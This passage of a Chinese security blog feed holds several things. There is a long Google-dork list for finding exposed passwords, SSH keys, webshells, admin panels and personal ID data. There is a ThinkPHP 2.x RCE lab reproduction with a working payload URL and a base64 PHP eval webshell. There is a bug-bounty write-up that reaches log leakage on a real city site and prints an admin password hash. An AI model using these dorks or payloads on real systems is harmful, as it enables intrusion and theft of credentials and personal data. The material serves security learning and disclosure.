href="https://link.zhihu.com/?target=http://cloudshark.org/captures">http://cloudshark.org/captures</a> password 包含密码的PCAP捕获</p><p>inurl:&#x2F;o&#x2F;oauth2 inurl:client_id 搜索这个将返回与OAuth2协议中的认证过程一起使用的各种客户端ID</p><p>intitle:Login “Login to pfSense” “Password” “LLC” pfSense防火墙管理登录页面</p><p>inurl:iProber2.php ext:php 类别：包含多媒体信息的文件漏洞作者</p><p>inurl:&#x2F;\filesrc&#x3D;**** ~”Current” ~”:&#x2F;“ ~”upload” 网站上涵盖的大量外壳后门鼠标列表</p><p>inurl:~&#x2F;<a href="ftp://0.0.0.193/">ftp://193</a> filetype:(php | txt | html | asp | xml | cnf | sh) ~‘&#x2F;html‘ 通过IP地址查找FTP服务器列表</p><p>inurl:&#x2F;index.php?option&#x3D;com_artforms 组件SQL注入</p><p>“dirLIST - PHP Directory Lister” “Banned files: php | php3 | php4 | php5 | htaccess | htpasswd | asp | aspx” “index of” ext:php 禁止文件</p><p>intitle:”index of&#x2F;“ CCCam.cfg 配置文件包含CCCam服务器的用户和密码</p><p>inurl:cgi-bin “ARRIS Enterprises” 面板ARRIS路由器</p><p>inurl:”&#x2F;viewlsts.aspx?BaseType&#x3D;”</p><p>“Powered by AutoIndex PHP Script” ext:php 敏感目录和文件包含多媒体信息</p><p>inurl:action&#x3D;php.login 你可以找到不同的管理页面</p><p>“All site content” ext:aspx Sharepoint管理网</p><p>inurl:admin inurl:uploads 从上传网站捕获图像和文字</p><p>inurl:&#x2F;fckeditor&#x2F;editor&#x2F;plugins&#x2F;ajaxfilemanager&#x2F;ajaxfilemanager.php 敏感目录</p><p>inurl:<a href="https://link.zhihu.com/?target=http://github.com">http://github.com</a> intitle:config intext:”&#x2F;msg nickserv identify” 原始密码</p><p>inurl:”&#x2F;html&#x2F;modeminfo.asp? NetGear路由器信息</p><p>intitle:”Log In to AR Web” 华为AR路由器登录面板</p><p>inurl:user_guide intext:”CodeIgniter User Guide” 离线用户指南</p><p>allinurl: <a href="https://link.zhihu.com/?target=http://drive.google.com/open?id=">http://drive.google.com/open?id=</a> 文件和用户共享谷歌驱动器的数据</p><p>site:<a href="https://link.zhihu.com/?target=http://webex.com">http://webex.com</a> inurl:tc3000 访问一些会议信息</p><p>inurl:”&#x2F;debug&#x2F;default” intitle:”Yii Debugger” Yii调试器PHP框架服务器信息</p><p>inurl:proftpdpasswd proftpd密码</p><p>inurl:&#x2F;mjpg&#x2F;video.mjpg 在线设备</p><p>intitle:”Vigor Login Page” Vigor路由器登录面板</p><p>Meg4-Mail ext:php PHP邮箱</p><p>intitle:”Integrated Dell Remote Access Controller 6 - Enterprise” 戴尔远程访问控制器</p><p>Hostinger ? 2016. All rights reserved inurl:default.php Hostinger虚拟主机客户端默认公开页面，敏感目录列表</p><p>“PHP Credits” “Configuration” “PHP Core” ext:php inurl:info info另一种查看Phpinfo（）的方式</p><p>inurl:”.esy.es&#x2F;default.php” public_html文件夹中的文件列表</p><p>“PHP Mailer” “priv8 Mailer” ext:php</p><p>intitle:”SonicWALL - Authentication” SonicWALL防火墙登录门户</p><p>intitle:”Login” inurl:”&#x2F;doc&#x2F;page&#x2F;login.asp” HikVision网络摄像头的界面</p><p>inurl:&#x2F;php&#x2F;info.php Web服务器检测</p><p>“PHP eMailer is created by” ext:php</p><p>intitle:Leaf PHP Mailer by [leafmailer.pw] ext:php</p><p>“File Manager Version 1.0” “Coded By” 文件管理器</p><p>inurl:ManageFilters.jspa?filterView&#x3D;popular 提供热门的JIRA问题主题</p><p>intext:SOAP 1.1 intext:SOAP 1.2 intext:UPLOAD intext:GET intext:POST inurl:op 识别易受攻击的网站</p><p><a href="https://link.zhihu.com/?target=https://paper.dropbox.com">https://paper.dropbox.com</a> inurl:&#x2F;doc&#x2F;</p><p>intitle:”HFS” “Server Uptime” “Server time” Web服务器检测</p><p>inurl:”apc.php” intitle:”APC INFO”</p><p>“PHP Version” inurl:&#x2F;php&#x2F;phpinfo.php 关PHP安装的信息的页面</p><p>“Upload” inurl:”<a href="https://link.zhihu.com/?target=https://webfiles">https://webfiles</a>“ 发现页面易受目录遍历，上传和下载文件的影响</p><p>inurl:”-&#x2F;monitoring” “statistics of JavaMelody” 监控JavaEE应用程序。允许可视化sql请求</p><p>“[HKEY_CURRENT_USER\Software\sota\FFFTP]” filetype:reg Windows服务器的多媒体信息的文件</p><p>inurl:<a href="https://link.zhihu.com/?target=http://calendar.google.com/calendar/embed?src=">http://calendar.google.com/calendar/embed?src=</a> 公开的Google日历</p><p>(@<a href="https://link.zhihu.com/?target=http://gmail.com">http://gmail.com</a> || @<a href="https://link.zhihu.com/?target=http://yahoo.com">http://yahoo.com</a> || @<a href="https://link.zhihu.com/?target=http://hotmail.com">http://hotmail.com</a>) ext:php inurl:compose mail邮件服务器的邮件帐户名和其他数据</p><p>intitle:”open webif” “Linux set-top-box” 允许完全控制Dreambox TV机顶盒的Web界面</p><p>inurl:&#x2F;mjpgmain.asp 名称&#x3D; Y-cam的实时视图</p><p>inurl:&#x2F;web&#x2F;device&#x2F;login?lang&#x3D;1 h3c web管理登录页面</p><p>intitle:”StrongLoop API Explorer” intext:”Token Not Set” 寻找开放的Strongloop的环回API资源管理器</p><p>“This WebUI administration tool requires scripting support” intitle:‘Login‘ intext:‘Admin Name:‘ -score Juniper Netscreen WebUI登录页面</p><p>inurl:”<a href="https://link.zhihu.com/?target=https://vdi">https://vdi</a>“ Horizo??n登录页面</p><p>index:”html&#x2F;js&#x2F;editor&#x2F;fckeditor&#x2F;editor&#x2F;filemanager&#x2F;connectors” 敏感目录</p><p>inurl:&#x2F;?skipANDROID&#x3D;true intext:”Pydio Community” Pydio社区，云和安全的FTP服务器登录</p><p>inurl:”html&#x2F;js&#x2F;editor&#x2F;ckeditor&#x2F;“ 敏感目录入口</p><p>“generated by Munin” inurl:index -intext:index localhost Munin网络小组</p><p>“You have selected the following files for upload (0 Files).” 查找文件上传页面</p><p>inurl:&#x2F;human.aspx?r&#x3D; 安全的ftp服务器登录</p><p>inurl:”&#x2F;wp-content&#x2F;wpclone-temp&#x2F;wpclone_backup&#x2F;“ 备份目录包含WordPress用户名和密码</p><p>inurl:”&#x2F;sgdadmin&#x2F;“ Secure Global Desktop Oracle Secure Global桌面控制台和管理员帮助</p><p>intitle:”nstview v2.1:: <a href="https://link.zhihu.com/?target=http://nst.void.ru">http://nst.void.ru</a>“ | intext:”nsTView v2.1 :: nst.void.ru. Password: Host:”</p><p>filetype:php intext:Your Email: intext:Your Name: intext:Reply-To: intext:mailer 邮箱用户名修改页面</p><p>inurl:log -intext:log ext:log inurl:wp- 从wordpress网站上获取日志</p><p>inurl:ipf.conf -intext:ipf.conf ext:conf Solaris系统防火墙</p><p>inurl:wp-content&#x2F;debug.log 启用调试日志的一些操作…</p><p>intitle:Sign In inurl:&#x2F;adfs&#x2F;ls&#x2F;?wa&#x3D;wsignin1.0 用户登录页面</p><p>(inurl:”8080&#x2F;monitorix” &amp; intext:”Hostname”) | inurl:”8080&#x2F;monitorix-cgi” Monitorix系统监控工具web界面</p><p>inurl:”&#x2F;login&#x2F;login.html” intitle:”Greenbone Security Assistant” OpenVAS登录页面</p><p>inurl:”&#x2F;weathermap&#x2F;weathermap-cacti-plugin.php” 通过Weathermap Cacti插件映射IT基础设施</p><p>intext:”Web Application Report” intext:”This report was created by IBM Security AppScan” ext:pdf 搜索IBMAppScan漏洞报告</p><p>“Web Application Assessment Report” ext:pdf 搜索HP WebInspect扫描报告</p><p>inurl:index of driver.php?id&#x3D; 发现操作系统警告</p><p>intitle:”bandwidthd” “programmed by david hinkle, commissioned by derbytech wireless networking.” BandwidthD搜索报告</p><p>inurl:&#x2F;Portal&#x2F;Portal.mwsl 这是西门子S7系列PLC控制器的代号</p><p>inurl:&#x2F;FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;upload&#x2F; 受保护的文件进行身份验证。</p><p>inurl:Dialin&#x2F;Conference.aspx 登录门户的页面</p><p>inurl:pictures intitle:index.of 负载的个人图片</p><p>inurl:sgms&#x2F;auth 找到Sonicwall GMS服务器</p><p>site:<a href="https://link.zhihu.com/?target=http://static.ow.ly/docs/">http://static.ow.ly/docs/</a> intext:@<a href="https://link.zhihu.com/?target=http://gmail.com">http://gmail.com</a> | Password 缓存中的密码的文档</p><p>inurl:DiGIR.php fnkym0nky描述</p><p>intext:”Dumping data for table <code>orders</code>“ 个人信息的SQL转储文件</p><p>filetype:sql intext:wp_users phpmyadmin wp漏洞报告</p><p>“index of” bigdump.php 交错的MySQL转储进口商文件</p><p>“Index of &#x2F;wp-content&#x2F;uploads&#x2F;backupbuddy_backups” zip 搜索iThemes BackupBuddy备份拉链</p><p>intext:”&#x2F;showme.asp” HTTP_ACCEPT HTTP_ACCEPT服务器的应用程序和会话内容</p><p>intext:”&#x2F;LM&#x2F;W3SVC&#x2F;“ ext:asp 提供信息的asp ServerVariables</p><p>inurl:top.htm inurl:currenttime 在线相机</p><p>intext:”Hello visitor from” ext:asp</p><p>intext:”expects parameter 1 to be resource, boolean given” filetype:php 易受攻击的基于mysql的网站</p><p>inurl:&#x2F;awcuser&#x2F;cgi-bin&#x2F; Mitel系统</p><p>site:<a href="https://link.zhihu.com/?target=http://github.com">http://github.com</a> ext:csv userid | username | user -example password 用户 示例密码诱饵</p><p>inurl:”&#x2F;wp-content&#x2F;uploads&#x2F;levoslideshow&#x2F;“ Webshel??l上传</p><p>Zixmail inurl:&#x2F;s&#x2F;login? Zixmail安全电子邮件登录门户</p><p>inurl:”&#x2F;wp-content&#x2F;plugins&#x2F;wp-mobile-detector&#x2F;“ ext:php Detector 3.5远程Shell上传</p><p>inurl:trash intitle:index.of 敏感目录</p><p>inurl:.ssh intitle:index.of authorized_keys SSH密钥</p><p>inurl:&#x2F;remote&#x2F;login&#x2F; intext:”please login”|intext:”FortiToken clock drift detected” 录门户的页面</p><p>intitle:”Hamdida X_Shell Backd00r” 后门</p><p>inurl:&#x2F;WebInterface&#x2F;login.html CrushFTP的登录页面可能会弹出其他程序的FTP页面</p><p>intext:”Powered by BOMGAR” BOMGAR在线设备</p><p>intext:”Forum software by XenForo?” 论坛软件”XenForo SQLi漏洞</p><p>ext:php inurl:”api.php?action&#x3D;” SQLi漏洞</p><p>inurl:”&#x2F;webmail&#x2F;“ intitle:”Mail - AfterLogic WebMail” -site:<a href="https://link.zhihu.com/?target=http://afterlogic.org">http://afterlogic.org</a> -site:<a href="https://link.zhihu.com/?target=http://afterlogic.com">http://afterlogic.com</a> WebMail XXE注入漏洞</p><p>filetype:txt “gmail” | “hotmail” | “yahoo” -robots site:gov | site:us 电子邮件</p><p>inurl:citrix inurl:login.asp -site:<a href="https://link.zhihu.com/?target=http://citrix.com">http://citrix.com</a> Citrix登录门户网站</p><p>inurl:vidyo -site:<a href="https://link.zhihu.com/?target=http://vidyo.com">http://vidyo.com</a> inurl:portal Vidyo门户</p><p>intitle:”MODX CMF Manager Login” 搜索MODX登录门户</p><p>“Fenix Final Version v2.0” filetype:php Web-Shell新的</p><p>inurl:demo.browse.php intitle:getid3 getID3演示可以允许目录遍历，删除文件等</p><p>inurl:&#x2F;sites&#x2F;default&#x2F;files&#x2F;webform&#x2F; Drupal默认的Web表单的存储路径</p><p>intext:”eav” filetype:txt NOD32防病毒帐户的用户名和密码的文件</p><p>intitle:”Struts Problem Report” intext:”development mode is enabled.” Struts问题报告</p><p>index of &#x2F;wp-content&#x2F;uploads&#x2F;userpro csv文件发现有很多个人信息</p><p>inurl:”&#x2F;owncloud&#x2F;public.php” -github -forum 共享文件Owncloud</p><p>inurl:”&#x2F;eyeos&#x2F;index.php” -github -forum 登录门户的页面</p><p>inurl:”&#x2F;owncloud&#x2F;index.php” -github -forum owncloud门户页面</p><p>inurl:configfile.cgi configfile.cgi D0bby</p><p>filetype:pwd intitle:index 登录门户的页面</p><p>site:<a href="https://link.zhihu.com/?target=http://github.com">http://github.com</a> filetype:md | filetype:js | filetype:txt “xoxp-“ 松散认证令牌</p><p>&#x2F;@fmb80_encoder.htm 声音技术在广播fm</p><p>filetype:pdf intitle:”SSL Report” SSL报告主机</p><p>intitle:”Skipfish . scan” Skipfish</p><p>filetype:pcf “cisco” “GroupPwd” 具有组密码的Cisco VPN文件进行远程访问</p><p>filetype:rcf inurl:vpn VPN客户端文件包含敏感信息和登录</p><p>intitle:Index of &#x2F;__MACOSX … 父目录Wordpress信息</p><p>inurl:dynamic.php?page&#x3D;mailbox Webmail登录页面</p><p>inurl:<a href="https://link.zhihu.com/?target=http://inmotionhosting.com:2096/">http://inmotionhosting.com:2096/</a> Webmail登录页面</p><p>site:<a href="https://link.zhihu.com/?target=http://pastebin.com">http://pastebin.com</a> intext:@<a href="https://link.zhihu.com/?target=http://gmail.com">http://gmail.com</a> | @<a href="https://link.zhihu.com/?target=http://yahoo.com">http://yahoo.com</a> | @<a href="https://link.zhihu.com/?target=http://hotmail.com">http://hotmail.com</a> daterange:2457388-2457491 包含电子邮件和相关密码列表的文件</p><p>inurl:userRpm inurl:LoginRpm.htm 列出所有TPLink路由器</p><p>inurl:<a href="https://link.zhihu.com/?target=https://pma">https://pma</a>. 登录门户</p><p>inurl:&#x2F;dynamic&#x2F;login-simple.html? 访问linksys智能WiFi帐户</p><p>inurl:&#x2F;Remote&#x2F;logon?ReturnUrl &#x2F;远程&#x2F;登录ReturnUrl易受攻击的Windows服务</p><p>inurl:index.php?app&#x3D;main intitle:sms 登录门户到播放器webapp默认密码admin：admin</p><p>inurl:&#x2F;view&#x2F;viewer_index.shtml</p><h4 id="常用："><a href="#常用：" class="headerlink" title="常用："></a><strong>常用：</strong></h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">site:[http://gov.cn](https://link.zhihu.com/?target=http%3A//gov.cn) inurl:.login.asp (z政府网站后台)<br>inurl:[http://gov.cn/admin](https://link.zhihu.com/?target=http%3A//gov.cn/admin) （百度就可以）<br>inurl:gitlab 公司 filetype:txt<br>inurl:gitlab 公司 intext:账号<br>site:*. [http://gitee.com](https://link.zhihu.com/?target=http%3A//gitee.com) intext:账号 （ ftp://*:* 密码 地址）<br>site:*. [http://gitee.com](https://link.zhihu.com/?target=http%3A//gitee.com) filetype:txt 账号 （ ftp://*:* 密码 地址）<br>site:gitlab.*.com intext:密码<br>site: [http://code.aliyun.com](https://link.zhihu.com/?target=http%3A//code.aliyun.com) 2019 服务器地址<br></code></pre></td></tr></table></figure><h4 id="Google高级预定义搜索语法如下"><a href="#Google高级预定义搜索语法如下" class="headerlink" title="Google高级预定义搜索语法如下"></a>Google高级预定义搜索语法如下</h4><p>filetype:xls site: 名单 &#x2F;&#x2F;信息泄露<br>inurl &#x2F;search_results.php search&#x3D; XSS 漏洞<br>site:域名 inurl:admin</p><h4 id="用友"><a href="#用友" class="headerlink" title="用友"></a>用友</h4><p>用友：用友grpu8高校内控管理<br>UFIDA NC协同-OA</p><h4 id="对公网的语法："><a href="#对公网的语法：" class="headerlink" title="对公网的语法："></a>对公网的语法：</h4><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">inurl:</span>备份 filetype:txt 密码<br><span class="hljs-symbol">inurl:</span>config.php filetype:bak<br><span class="hljs-symbol">inurl:</span>data<br><span class="hljs-string">&quot;index of/&quot;</span> xxx (mp3等等)<br>Index of /password<br><span class="hljs-string">&quot;Index of /&quot;</span> +passwd<br><span class="hljs-string">&quot;Index of /&quot;</span> +password.txt<br><span class="hljs-symbol">inurl:</span>phpMyAdmin<br><span class="hljs-symbol">inurl:</span>ewebeditor<br><span class="hljs-symbol">intitle:</span>后台管理<br><span class="hljs-symbol">intitle:</span>后台管理 inurl:admin<br><span class="hljs-symbol">inurl:</span>http:<span class="hljs-comment">//baidu.com</span><br><span class="hljs-symbol">inurl:</span>php?<span class="hljs-attr">id</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br><span class="hljs-symbol">inurl:</span>login<br><span class="hljs-symbol">site:</span> <span class="hljs-string">&quot;身份证&quot;</span> <span class="hljs-string">&quot;学生证&quot;</span> <span class="hljs-string">&quot;1992&quot;</span> <span class="hljs-string">&quot;1993&quot;</span> <span class="hljs-string">&quot;1994&quot;</span> <span class="hljs-string">&quot;1995&quot;</span> <span class="hljs-string">&quot;1996&quot;</span> <span class="hljs-string">&quot;1997&quot;</span> <span class="hljs-string">&quot;1998&quot;</span> <span class="hljs-string">&quot;1999&quot;</span> <span class="hljs-string">&quot;2000&quot;</span><br><span class="hljs-symbol">site:</span>.cn filetype:xls <span class="hljs-string">&quot;服务器&quot;</span> <span class="hljs-string">&quot;地址&quot;</span> <span class="hljs-string">&quot;账号&quot;</span><br><span class="hljs-symbol">site:</span>file.*.net（.com/.cn）<br><span class="hljs-symbol">inurl:</span>ali <span class="hljs-string">&quot;管理平台&quot;</span><br>cache<br><br>类似于百度快照功能，通过cache或许可以查看到目标站点删除的敏感文件<br>也可以用来解决找目标站点的物理路径不报错，而无法找到物理路径。<br><span class="hljs-symbol">cache:</span>[http:<span class="hljs-comment">//xxx.com](https://link.zhihu.com/?target=http%3A//xxx.com)</span><br><br>“” + - | AND<br>将要搜索的关键字用引号括起来，搜索引擎将会搜索完全匹配关键字的网页<br>“房产” +南京 <span class="hljs-comment">//搜索与南京有关的房产</span><br>“房产” -南京 <span class="hljs-comment">//搜索结果除去南京的房产</span><br>房产|酒店 <span class="hljs-comment">//搜索房产或者酒店有关的页面</span><br>房产 AND 酒店 <span class="hljs-comment">//搜索同时匹配房产与酒店这两个关键词的页面</span><br></code></pre></td></tr></table></figure><p>对限定目标类型的语法：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">inurl:</span>gitlab 公司 filetype:txt<br><span class="hljs-symbol">inurl:</span>gitlab 公司 intext:账号<br><span class="hljs-symbol">site:</span>*.http:<span class="hljs-comment">//gitee.com intext:账号 （ftp://*:* 密码 地址）</span><br><span class="hljs-symbol">site:</span>*.http:<span class="hljs-comment">//gitee.com filetype:txt 账号 （ftp://*:* 密码 地址）</span><br><span class="hljs-symbol">site:</span>gitlab.*.com intext:密码<br><span class="hljs-symbol">site:</span>http:<span class="hljs-comment">//code.aliyun.com 2019 服务器地址</span><br></code></pre></td></tr></table></figure><p>对限定域名的语法：</p><p>site:<a href="https://link.zhihu.com/?target=http://xxxx.com">http://xxxx.com</a><br>site:<a href="https://link.zhihu.com/?target=http://xxxx.com">http://xxxx.com</a> filetype: txt (doc docx xls xlsx txt pdf等)<br>site:<a href="https://link.zhihu.com/?target=http://xxxx.com">http://xxxx.com</a> intext:管理<br>site:<a href="https://link.zhihu.com/?target=http://xxxx.com">http://xxxx.com</a> inurl:login<br>site:<a href="https://link.zhihu.com/?target=http://xxxx.com">http://xxxx.com</a> intitle:管理<br>site:<a href="https://link.zhihu.com/?target=http://a2.xxxx.com">http://a2.xxxx.com</a> filetype:asp(jsp php aspx等)<br>site:<a href="https://link.zhihu.com/?target=http://a2.xxxx.com">http://a2.xxxx.com</a> intext:ftp:&#x2F;&#x2F;<em>:</em>(地址 服务器 虚拟机 password等)<br>site:<a href="https://link.zhihu.com/?target=http://a2.xxxx.com">http://a2.xxxx.com</a> inurl:file(load)<br>site:<a href="https://link.zhihu.com/?target=http://xxxx.com">http://xxxx.com</a> intext:*@<a href="https://link.zhihu.com/?target=http://xxxx.com">http://xxxx.com</a> &#x2F;&#x2F;得到N个邮件地址，还有邮箱的主人的名字什么的<br>site:<a href="https://link.zhihu.com/?target=http://xxxx.com">http://xxxx.com</a> intext:电话 &#x2F;&#x2F;N个电话</p>]]></content>
    
    
    <categories>
      
      <category>SRC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SRC</tag>
      
      <tag>技巧</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Thinkphp2.x_RCE靶场复现</title>
    <link href="/2023/08/12/Thinkphp2-x-RCE%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/08/12/Thinkphp2-x-RCE%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>vulfocus靶场复现</p><span id="more"></span><h2 id="Thinkphp2-x-RCE复现"><a href="#Thinkphp2-x-RCE复现" class="headerlink" title="Thinkphp2.x_RCE复现"></a>Thinkphp2.x_RCE复现</h2><p>谷歌语法：<code>intext:ThinkPHP 2.1 &#123; Fast &amp; Simple OOP PHP Framework &#125;</code></p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p><a href="https://www.webshell.cc/3955.html">一篇很老的文章</a></p><p>存在原因是ThinkPHP2.x版本，使用preg_replace的<code>/e</code>模式匹配路由：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;@(w+)&#x27;</span>.<span class="hljs-variable">$depr</span>.<span class="hljs-string">&#x27;([^&#x27;</span>.<span class="hljs-variable">$depr</span>.<span class="hljs-string">&#x27;/]+)@e&#x27;</span>, <span class="hljs-string">&#x27;$var[&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;]=&quot;2&quot;;&#x27;</span>, <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-variable">$depr</span>,<span class="hljs-variable">$paths</span>));<br></code></pre></td></tr></table></figure><p>这个代码是把pathinfo当作restful类型url进行解析的，主要作用是把pathinfo中的数据解析并合并到$_GET数组中。</p><p>preg_replace(‘正则规则’,’替换字符’,’目标字符’)</p><p>而<code>/e</code>模式会将替换字符当作PHP代码执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&#x27;$var[&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;]=&quot;2&quot;;&#x27;</span><br></code></pre></td></tr></table></figure><p>而这里又是双引号，而双引号中的php变量语法又是能够被解析执行的。因此，攻击者只要对任意一个使用thinkphp框架编写的应用程序，使用如下方式进行访问，即可执行任意PHP代码：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">index.php/module/action/param1/$&#123;@print(THINK_VERSION)&#125;<br></code></pre></td></tr></table></figure><p>写入木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(“M3gucGhw”),”w”),<span class="hljs-title function_ invoke__">base64_decode</span>(“PD9ldmFsKCRfUE9TVFt4XSk7Pz4=”))<br></code></pre></td></tr></table></figure><h3 id="Vulfocus靶场复现"><a href="#Vulfocus靶场复现" class="headerlink" title="Vulfocus靶场复现"></a>Vulfocus靶场复现</h3><p>选择在vulfocus开启一个本地镜像进行复现学习。</p><p><img src="/2023/08/12/Thinkphp2-x-RCE%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/Snipaste_2023-08-12_20-25-00.png"></p><p>测试是否存在，拼接路由<code>/index.php/module/action/param1/$&#123;@phpinfo()&#125;</code></p><p><img src="/2023/08/12/Thinkphp2-x-RCE%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/Snipaste_2023-08-13_16-28-05.png"></p><p>使用漏洞利用工具扫描，得到相同的结果</p><p><img src="/2023/08/12/Thinkphp2-x-RCE%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/Snipaste_2023-08-13_16-29-56.png"></p><p>存在<code>tp2_lite_code_exec</code>漏洞，传马Getshell</p><p><img src="/2023/08/12/Thinkphp2-x-RCE%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/Snipaste_2023-08-13_16-33-42.png"></p><p>使用蚁剑连接，</p><p><img src="/2023/08/12/Thinkphp2-x-RCE%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/Snipaste_2023-08-13_16-37-47.png"></p><p>找到flag，通关</p><p><img src="/2023/08/12/Thinkphp2-x-RCE%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/Snipaste_2023-08-13_16-40-05.png"></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>Thinkphp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一次公益src挖掘-230804</title>
    <link href="/2023/08/10/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230804/"/>
    <url>/2023/08/10/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230804/</url>
    
    <content type="html"><![CDATA[<p>终于有一个TP的洞啦！😘</p><span id="more"></span><h3 id="鹰图找目标"><a href="#鹰图找目标" class="headerlink" title="鹰图找目标"></a>鹰图找目标</h3><p><a href="https://hunter.qianxin.com/">https://hunter.qianxin.com/</a></p><p>搜索语法，找到PHP的站点</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">icp.name<span class="hljs-operator">=</span><span class="hljs-string">&quot;xxx市&quot;</span> and app.vendor<span class="hljs-operator">=</span><span class="hljs-string">&quot;PHP&quot;</span><br></code></pre></td></tr></table></figure><h3 id="发现存在Thinkphp框架"><a href="#发现存在Thinkphp框架" class="headerlink" title="发现存在Thinkphp框架"></a>发现存在Thinkphp框架</h3><p>访问网站，出现登陆页</p><p><img src="/2023/08/10/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230804/Snipaste_2023-08-10_23-08-06.png"></p><p>发现采用ThinkPHP框架</p><p><img src="/2023/08/10/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230804/Snipaste_2023-08-10_23-09-15.png"></p><p>使用工具扫描直接出ThinkPHP3.2.3日志泄露</p><p><img src="/2023/08/10/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230804/Snipaste_2023-08-10_23-12-07.png"></p><p>访问url：<a href="http://xxx.xxx.com/App/Runtime/Logs/Home/23_08_04.log">http://xxx.xxx.com/App/Runtime/Logs/Home/23_08_04.log</a></p><p>确认存在日志信息泄露，且发现存在用户名和密码的hash值泄露</p><p><img src="/2023/08/10/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230804/Snipaste_2023-08-10_23-14-53.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> `yz_users` <span class="hljs-keyword">WHERE</span> `username` <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">AND</span> `password` <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;591d1260284e15731d151787dd6ad356&#x27;</span> LIMIT <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="写Python脚本遍历收集"><a href="#写Python脚本遍历收集" class="headerlink" title="写Python脚本遍历收集"></a>写Python脚本遍历收集</h3><p>选择写一个Python脚本收集所有用户名和密码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">18</span>,<span class="hljs-number">24</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span 